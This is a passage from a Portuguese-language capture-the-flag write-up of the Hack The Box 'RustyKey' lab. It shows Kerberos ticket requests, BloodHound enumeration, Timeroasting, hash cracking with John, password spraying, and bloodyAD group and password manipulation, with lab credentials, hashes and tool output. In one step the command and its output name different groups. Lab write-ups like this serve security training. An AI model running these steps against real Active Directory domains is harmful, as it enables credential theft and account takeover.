</span></span><span class=line><span class=cl>                    <span class=nv>kdc</span> <span class=o>=</span> dc.rustykey.htb
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span></code></pre></div><p>Após essa configuração, podemos solicitar o TGT:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kinit rr.parker@RUSTYKEY.HTB
</span></span></code></pre></div><p>Para validar se o TGT gerado foi válido, podemos usar o <code>klist</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; klist
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ticket cache: FILE:/tmp/krb5cc_0
</span></span><span class=line><span class=cl>Default principal: rr.parker@RUSTYKEY.HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Valid starting       Expires              Service principal
</span></span><span class=line><span class=cl>10/29/2025 23:38:25  10/30/2025 09:38:25  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
</span></span><span class=line><span class=cl>        renew <span class=k>until</span> 10/30/2025 23:38:21
</span></span></code></pre></div><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Sempre que o NTLM do AD estiver desabilitado e precisar utilizar tickets TGT/TGS, SEMPRE UTILIZE O HOST COM <code>DC.DOMINIO.HTB</code> pois o Kerberos só trabalha com DNS!</strong></span></div><p>Com esse TGT, podemos finalmente acessar as shares SMB usando o <a href=https://www.netexec.wiki/ target=_blank>Netexec</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=s2>&#34;dc.rustykey.htb&#34;</span> -u <span class=s1>&#39;rr.parker&#39;</span> -p <span class=s1>&#39;8#t5HE8L!W3A&#39;</span> --shares -k
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:dc<span class=o>)</span> <span class=o>(</span>domain:rustykey.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>NTLM:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\r</span>r.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW 
</span></span></code></pre></div><p>Porém nos deparamos com o erro <code>KRB_AP_ERR_SKEW</code>, esse erro sempre acontece quando o horário da sua máquina está diferente do horário do Kerberos. Tem várias maneiras de corrigir isso, no meu caso estarei usando o <a href=https://packages.debian.org/sid/faketime target=_blank>Faketime</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s2>&#34;</span><span class=k>$(</span>rdate -n <span class=nv>$DC_IP</span> -p <span class=p>|</span> awk <span class=s1>&#39;{print $2, $3, $4}&#39;</span> <span class=p>|</span> date -f - <span class=s2>&#34;+%Y-%m-%d %H:%M:%S&#34;</span><span class=k>)</span><span class=s2>&#34;</span> zsh
</span></span></code></pre></div><p>O <code>Faketime</code> irá sincronizar apenas o horário da shell atual com o horário do Kerberos. Com o horário sincronizado, podemos usar novamente o <code>Netexec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=s2>&#34;dc.rustykey.htb&#34;</span> -u <span class=s1>&#39;rr.parker&#39;</span> -p <span class=s1>&#39;8#t5HE8L!W3A&#39;</span> --shares -k
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:dc<span class=o>)</span> <span class=o>(</span>domain:rustykey.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>NTLM:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               <span class=o>[</span>+<span class=o>]</span> rustykey.htb<span class=se>\r</span>r.parker:8#t5HE8L!W3A 
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               <span class=o>[</span>*<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               C$                              Default share
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         dc.rustykey.htb <span class=m>445</span>    dc               SYSVOL          READ            Logon server share 
</span></span></code></pre></div><p>Porém não encontramos nada interessante nas shares. Irei partir pra enumeração do AD, estarei usando o <a href=https://github.com/dirkjanm/BloodHound.py target=_blank>bloodhound-python</a> para fazer a enumeração e gerar o zip:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodhound-python -d rustykey.htb -ns 10.10.11.75 -u rr.parker -p <span class=s1>&#39;8#t5HE8L!W3A&#39;</span> -k -c ALL --zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>INFO: BloodHound.py <span class=k>for</span> BloodHound LEGACY <span class=o>(</span>BloodHound 4.2 and 4.3<span class=o>)</span>
</span></span><span class=line><span class=cl>INFO: Found AD domain: rustykey.htb
</span></span><span class=line><span class=cl>INFO: Using TGT from cache
</span></span><span class=line><span class=cl>INFO: Found TGT with correct principal in ccache file.
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.rustykey.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
</span></span><span class=line><span class=cl>INFO: Found <span class=m>16</span> computers
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.rustykey.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>12</span> users
</span></span><span class=line><span class=cl>INFO: Found <span class=m>58</span> groups
</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> gpos
</span></span><span class=line><span class=cl>INFO: Found <span class=m>10</span> ous
</span></span><span class=line><span class=cl>INFO: Found <span class=m>19</span> containers
</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: 
</span></span><span class=line><span class=cl>INFO: Querying computer: dc.rustykey.htb
</span></span><span class=line><span class=cl>INFO: Done in 00M 31S
</span></span><span class=line><span class=cl>INFO: Compressing output into 20251030000528_bloodhound.zip
</span></span></code></pre></div><p>Com o zip gerado, estarei utilizando o <a href=https://github.com/SpecterOps/BloodHound-Legacy target=_blank>Bloodhound-legacy</a> para &ldquo;digerir&rdquo; esse dump e gerar o gráfico visual.</p><h2 class="relative group">Analisando o Active Directory<div id=analisando-o-active-directory class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#analisando-o-active-directory aria-label=Âncora>#</a></span></h2><h3 class="relative group">Realizando um Timeroasting para obter o IT-Computer3$<div id=realizando-um-timeroasting-para-obter-o-it-computer3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#realizando-um-timeroasting-para-obter-o-it-computer3 aria-label=Âncora>#</a></span></h3><p>Após algum tempo analisando o AD, não encontramos nada interessante a não ser as várias contas de computadores:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=computers src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761766306/f951227a-122e-4742-b4d0-c7ed5fcd39f1.png></figure><p>O que levanta a hipótese de um ataque de <a href=https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/timeroasting target=_blank>Timeroasting</a>. Utilizando o <a href=https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py target=_blank>script</a> do mesmo site, conseguimos as seguintes hashs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>1000:<span class=nv>$sntp</span>-ms<span class=nv>$3</span>fc8b5cffc215f72ebd3b779696baac5<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd516799587bce1b8428bffbfcd0aecad5b68059da4c1ecad5b68059dc64f
</span></span><span class=line><span class=cl>1103:<span class=nv>$sntp</span>-ms<span class=nv>$de79e918feba6ba77ad3ad58cd01cb37$1</span>c0111e900000000000a65e24c4f434cecacd51679b332c7e1b8428bffbfcd0aecad5b68c5bb4c71ecad5b68c5bb6fad
</span></span><span class=line><span class=cl>1104:<span class=nv>$sntp</span>-ms<span class=nv>$938</span>aee049b64154e27f64bd3f52791e2<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd5167b9f82e7e1b8428bffbfcd0aecad5b68c7a7942eecad5b68c7a7bfcd
</span></span><span class=line><span class=cl>1105:<span class=nv>$sntp</span>-ms<span class=nv>$11</span>c48527a1939d4b088d2456eb6ae77e<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd516788d0d9ae1b8428bffbfcd0aecad5b68c8adb90becad5b68c8adddf4
</span></span><span class=line><span class=cl>1106:<span class=nv>$sntp</span>-ms<span class=nv>$da784792e6ea12d62ebc509c03cd62a7$1</span>c0111e900000000000a65e24c4f434cecacd5167ab5ef3ae1b8428bffbfcd0aecad5b68cad69750ecad5b68cad6c142
</span></span><span class=line><span class=cl>1107:<span class=nv>$sntp</span>-ms<span class=nv>$ebd52e1657ffafb6b8da3f8277b9519c$1</span>c0111e900000000000a65e24c4f434cecacd5167c5e8922e1b8428bffbfcd0aecad5b68cc7f3641ecad5b68cc7f597c
</span></span><span class=line><span class=cl>1118:<span class=nv>$sntp</span>-ms<span class=nv>$6170</span>b4f9ad2199ecb6e1815a54f2db34<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd5167be30f2ee1b8428bffbfcd0aecad5b68e41421f5ecad5b68e41441d6
</span></span><span class=line><span class=cl>1119:<span class=nv>$sntp</span>-ms<span class=nv>$75010</span>daf1dd74db151f1af431798d79d<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd5167972bcb5e1b8428bffbfcd0aecad5b68e57ad304ecad5b68e57af99b
</span></span><span class=line><span class=cl>1120:<span class=nv>$sntp</span>-ms<span class=nv>$9635</span>feeb4d92dcdc860e2e1a8a054904<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd516786f9690e1b8428bffbfcd0aecad5b68e8903643ecad5b68e8906a45
</span></span><span class=line><span class=cl>1121:<span class=nv>$sntp</span>-ms<span class=nv>$77129</span>d188cb7d62d2b8a525db5c146d6<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd5167a9a5d0de1b8428bffbfcd0aecad5b68eabb01c9ecad5b68eabb2d68
</span></span><span class=line><span class=cl>1122:<span class=nv>$sntp</span>-ms<span class=nv>$496</span>ca062d4994931f60819a8252519a2<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd5167c405e94e1b8428bffbfcd0aecad5b68ec610350ecad5b68ec61309c
</span></span><span class=line><span class=cl>1123:<span class=nv>$sntp</span>-ms<span class=nv>$ffb4b4ab380b72116688ef5342171b95$1</span>c0111e900000000000a65e24c4f434cecacd51679f24be2e1b8428bffbfcd0aecad5b68edea04ebecad5b68edea2679
</span></span><span class=line><span class=cl>1124:<span class=nv>$sntp</span>-ms<span class=nv>$1</span>a54335d4224cf81a14b311a6836109f<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd51679f32957e1b8428bffbfcd0aecad5b68edeae0b4ecad5b68edeb059c
</span></span><span class=line><span class=cl>1125:<span class=nv>$sntp</span>-ms<span class=nv>$c96cc1fb895b1b093050b46858d0d1b4$1</span>c0111e900000000000a65e24c4f434cecacd51678811b1de1b8428bffbfcd0aecad5b68f0916949ecad5b68f0918929
</span></span><span class=line><span class=cl>1126:<span class=nv>$sntp</span>-ms<span class=nv>$3</span>f1007a180067d7601177870178d3330<span class=nv>$1</span>c0111e900000000000a65e24c4f434cecacd51678e9721fe1b8428bffbfcd0aecad5b68f0f9c1f8ecad5b68f0f9e02b
</span></span><span class=line><span class=cl>1127:<span class=nv>$sntp</span>-ms<span class=nv>$e29320686d737b188991617f060c6272$1</span>c0111e900000000000a65e24c4f434cecacd5167905a052e1b8428bffbfcd0aecad5b68f115ee7eecad5b68f1160e5f
</span></span></code></pre></div><p>Com elas, conseguimos brutar as hashs localmente usando o <code>John</code> ou o <code>Hashcat</code> e obter a seguinte senha:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john --wordlist<span class=o>=</span><span class=s2>&#34;/usr/share/wordlists/rockyou&#34;</span> hashs
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>16</span> password hashes with <span class=m>16</span> different salts <span class=o>(</span>timeroast, SNTP-MS <span class=o>[</span>MD4+MD5 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Note: Passwords longer than <span class=m>9</span> <span class=o>[</span>worst <span class=k>case</span> UTF-8<span class=o>]</span> to <span class=m>27</span> <span class=o>[</span>ASCII<span class=o>]</span> rejected
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, <span class=s1>&#39;h&#39;</span> <span class=k>for</span> help, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>Rusty88!         <span class=o>(</span>1125<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:19 DONE <span class=o>(</span>2025-10-29 16:37<span class=o>)</span> 0.05020g/s 719771p/s 11332Kc/s 11332KC/s !143u143..*7¡Vamos!
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed. 
</span></span></code></pre></div><p>Nesse ponto, temos uma senha sem saber de qual usuário é. Como o ataque de <code>Timeroasting</code> é focado em contas de computadores, irei fazer um spray com as contas de máquinas. Pra isso estarei usando o <code>Netexec</code> para separar os nomes e para fazer o spray de senha:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=s2>&#34;dc.rustykey.htb&#34;</span> -u <span class=s1>&#39;rr.parker&#39;</span> -p <span class=s1>&#39;8#t5HE8L!W3A&#39;</span> -k --computers <span class=p>|</span> awk <span class=s1>&#39;{print $5}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DC$
</span></span><span class=line><span class=cl>Support-Computer1$
</span></span><span class=line><span class=cl>Support-Computer2$
</span></span><span class=line><span class=cl>Support-Computer3$
</span></span><span class=line><span class=cl>Support-Computer4$
</span></span><span class=line><span class=cl>Support-Computer5$
</span></span><span class=line><span class=cl>Finance-Computer1$
</span></span><span class=line><span class=cl>Finance-Computer2$
</span></span><span class=line><span class=cl>Finance-Computer3$
</span></span><span class=line><span class=cl>Finance-Computer4$
</span></span><span class=line><span class=cl>Finance-Computer5$
</span></span><span class=line><span class=cl>IT-Computer1$
</span></span><span class=line><span class=cl>IT-Computer2$
</span></span><span class=line><span class=cl>IT-Computer3$
</span></span><span class=line><span class=cl>IT-Computer4$
</span></span><span class=line><span class=cl>IT-Computer5$
</span></span></code></pre></div><p>Fazendo o spray, descobrimos que a senha que encontramos é do <code>IT-Computer3$</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=s2>&#34;dc.rustykey.htb&#34;</span> -u computers -p <span class=s1>&#39;Rusty88!&#39;</span> -k
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>*<span class=o>]</span> None <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:rustykey.htb<span class=o>)</span>
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\S</span>upport-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\S</span>upport-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\S</span>upport-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\S</span>upport-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\S</span>upport-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\F</span>inance-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\F</span>inance-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\F</span>inance-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\F</span>inance-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\F</span>inance-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\I</span>T-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>-<span class=o>]</span> rustykey.htb<span class=se>\I</span>T-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED
</span></span><span class=line><span class=cl>LDAP        dc.rustykey.htb <span class=m>389</span>    DC               <span class=o>[</span>+<span class=o>]</span> rustykey.htb<span class=se>\I</span>T-Computer3$:Rusty88! 
</span></span></code></pre></div><p>E diferente do <strong>RR.PARKER</strong>, com esse usuário precisamos usar o <code>getTGT</code> do <a href=https://github.com/fortra/impacket target=_blank>Impacket</a> para solicitar o ticket TGT:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getTGT.py -dc-ip <span class=s2>&#34;dc.rustykey.htb&#34;</span> rustykey.htb/<span class=s2>&#34;IT-Computer3</span>$<span class=s2>&#34;</span>:<span class=s1>&#39;Rusty88!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in IT-Computer3$.ccache
</span></span></code></pre></div><p>Com o TGT do <strong>IT-Computer3$</strong>, abrimos um novo leque de ataques que podemos fazer.</p><h2 class="relative group">User Flag<div id=user-flag class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#user-flag aria-label=Âncora>#</a></span></h2><h3 class="relative group">Realizando um ForceChangePassword para obter o BB.MORGAN<div id=realizando-um-forcechangepassword-para-obter-o-bbmorgan class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#realizando-um-forcechangepassword-para-obter-o-bbmorgan aria-label=Âncora>#</a></span></h3><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=bb.morgan src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761776850/63aa35fa-1fb4-45ce-adb6-d5accdfb693e.png></figure><p>O nosso usuário tem permissão de <code>AddSelf</code> no grupo <code>HelpDesk</code> e, consequentemente <code>ForceChangePassword</code> nos usuários <strong>DD.ALI, GG.ANDERSON, EE.REED e BB.MORGAN</strong>, porém os mais interessantes aqui são o <strong>EE.REED e o BB.MORGAN</strong> pois eles são membros do grupo <code>REMOTE MANAGEMENT USERS</code>, o que permite acesso remoto com <code>Evil-Winrm</code>.</p><p>Então o nosso foco será o <strong>BB.MORGAN</strong>. Para isso primeiro temos que nos adicionarmos no grupo <code>HelpDesk</code>, estarei utilizando o <a href=https://github.com/CravateRouge/bloodyAD target=_blank>BloodyAD</a> para manipular o AD remotamente (caso queira uma &ldquo;colinha&rdquo; de comandos do <code>BloodyAD</code>, confira esse <a href=https://seriotonctf.github.io/BloodyAD-Cheatsheet/ target=_blank>site</a>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=s1>&#39;IT-Computer3$.ccache&#39;</span> bloodyAD --host <span class=s2>&#34;dc.rustykey.htb&#34;</span> -d <span class=s2>&#34;rustykey.htb&#34;</span> -k add groupMember <span class=s2>&#34;HelpDesk&#34;</span> <span class=s1>&#39;it-computer3$&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> it-computer3$ added to HelpDesk
</span></span></code></pre></div><p>Agora que estamos no grupo, precisamos pedir novamente um TGT para atualizar as nossas permissões e ai podemos alterar a senha do <strong>BB.MORGAN</strong> usando também o <code>BloodyAD</code>. Porém ao tentar mudar a senha, nos deparamos com esse erro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=s1>&#39;IT-Computer3$.ccache&#39;</span>  bloodyAD --host <span class=s2>&#34;dc.rustykey.htb&#34;</span> -d <span class=s2>&#34;rustykey.htb&#34;</span> -k <span class=nb>set</span> password <span class=s1>&#39;bb.morgan&#39;</span> <span class=s1>&#39;Password123!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/root/.local/bin/bloodyAD&#34;</span>, line 8, in &lt;module&gt;
</span></span><span class=line><span class=cl>    sys.exit<span class=o>(</span>main<span class=o>())</span>
</span></span><span class=line><span class=cl>             ^^^^^^
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py&#34;</span>, line 210, in main
</span></span><span class=line><span class=cl>    <span class=nv>output</span> <span class=o>=</span> args.func<span class=o>(</span>conn, **params<span class=o>)</span>
</span></span><span class=line><span class=cl>             ^^^^^^^^^^^^^^^^^^^^^^^^^
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py&#34;</span>, line 241, in password
</span></span><span class=line><span class=cl>    raise e
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py&#34;</span>, line 86, in password
</span></span><span class=line><span class=cl>    conn.ldap.bloodymodify<span class=o>(</span>target, <span class=o>{</span><span class=s2>&#34;unicodePwd&#34;</span>: op_list<span class=o>})</span>
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py&#34;</span>, line 301, in bloodymodify
</span></span><span class=line><span class=cl>    raise err
</span></span><span class=line><span class=cl>msldap.commons.exceptions.LDAPModifyException: Password can<span class=err>&#39;</span>t be changed. It may be because the oldpass provided is not valid.
</span></span><span class=line><span class=cl>You can try to use another password change protocol such as smbpasswd, server error may be more explicit.
</span></span></code></pre></div><p>Você deve estar se perguntando: &ldquo;Mas por que acontece isso mesmo tendo a permissão <code>ForceChangePassword</code>?&rdquo; Eu te respondo: isso ocorre porque o <strong>BB.MORGAN</strong> faz parte do grupo <code>Protected Objects</code>, e tudo que estiver dentro desse grupo, segundo a <strong>Microsoft</strong>:</p><blockquote><p>Protected accounts and groups are special objects where permissions are set and enforced via an automatic process that ensures the permissions on the objects remain consistent. These permissions remain even if you move the objects to different locations in Active Directory. If a protected object&rsquo;s permissions are modified, existing processes ensure that permissions are returned to their defaults quickly.</p></blockquote><p>Resumidamente, são objetos importantes que não podem ser alterados facilmente, então para alterarmos a senha do <strong>BB.MORGAN</strong> precisamos tirar ele desse grupo. E para isso, o <code>BloodyAD</code> nos ajudará novamente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=s1>&#39;IT-Computer3$.ccache&#39;</span>  bloodyAD --host <span class=s2>&#34;dc.rustykey.htb&#34;</span> -d <span class=s2>&#34;rustykey.htb&#34;</span> -k remove groupMember <span class=s2>&#34;CN=Protected Objects,CN=Users,DC=rustykey,DC=htb&#34;</span> <span class=s2>&#34;CN=IT,CN=Users,DC=rustykey,DC=htb&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> <span class=nv>CN</span><span class=o>=</span>Support,CN<span class=o>=</span>Users,DC<span class=o>=</span>rustykey,DC<span class=o>=</span>htb removed from <span class=nv>CN</span><span class=o>=</span>Protected Objects,CN<span class=o>=</span>Users,DC<span class=o>=</span>rustykey,DC<span class=o>=</span>htb
</span></span></code></pre></div><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
